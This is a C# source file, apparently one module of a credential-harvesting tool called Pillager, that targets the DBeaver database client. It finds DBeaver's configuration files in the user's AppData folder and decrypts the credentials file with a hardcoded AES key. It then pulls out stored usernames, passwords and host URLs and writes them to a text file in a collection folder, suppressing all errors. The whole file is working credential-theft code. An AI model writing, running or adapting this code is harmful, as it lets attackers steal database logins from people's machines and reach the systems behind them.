using Pillager.Helper;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Tools
{
    internal class DBeaver : ICommand
    {
        public string ConnectionInfo(string config, string sources)
        {
            StringBuilder sb = new StringBuilder();
            string pattern = @"\""(?<key>[^""]+)\""\s*:\s*\{\s*\""#connection\""\s*:\s*\{\s*\""user\""\s*:\s*\""(?<user>[^""]+)\""\s*,\s*\""password\""\s*:\s*\""(?<password>[^""]+)\""\s*\}\s*\}";
            MatchCollection matches = Regex.Matches(config, pattern);
            foreach (Match match in matches)
            {
                string key = match.Groups["key"].Value;
                string user = match.Groups["user"].Value;
                string password = match.Groups["password"].Value;
                sb.AppendLine(MatchDataSource(File.ReadAllText(sources), key));
                sb.AppendLine($"username: {user}");
                sb.AppendLine($"password: {password}");
                sb.AppendLine();
            }
            return sb.ToString();
        }

        public string MatchDataSource(string json, string jdbcKey)
        {
            string pattern = $"\"({Regex.Escape(jdbcKey)})\":\\s*{{[^}}]+?\"url\":\\s*\"([^\"]+)\"[^}}]+?}}";
            Match match = Regex.Match(json, pattern);
            if (match.Success)
            {
                string url = match.Groups[2].Value;
                return $"host: {url}";
            }
            return "";
        }

        public string GetAppDataFolderPath()
        {
            string appDataFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            return appDataFolderPath;
        }
        public string Decrypt(string filePath, string keyHex, string ivHex)
        {
            byte[] encryptedBytes = File.ReadAllBytes(filePath);
            byte[] key = StringToByteArray(keyHex);
            byte[] iv = StringToByteArray(ivHex);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream, Encoding.UTF8))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
        private byte[] StringToByteArray(string hex)
        {
            int numberChars = hex.Length;
            byte[] bytes = new byte[numberChars / 2];
            for (int i = 0; i < numberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }

        public override void Save(string path)
        {
            try
            {
                string sources = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData\\workspace6\\General\\.dbeaver\\data-sources.json");
                string credentials = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData\\workspace6\\General\\.dbeaver\\credentials-config.json");
                if (!File.Exists(sources)||!File.Exists(credentials))return;
                string savepath = Path.Combine(path, "DBeaver");
                Directory.CreateDirectory(savepath);
                string output = ConnectionInfo(Decrypt(credentials, "babb4a9f774ab853c96c2d653dfe544a", "00000000000000000000000000000000"), sources);
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "DBeaver.txt"), output, Encoding.UTF8);
            }
            catch { }
        }
    }
}
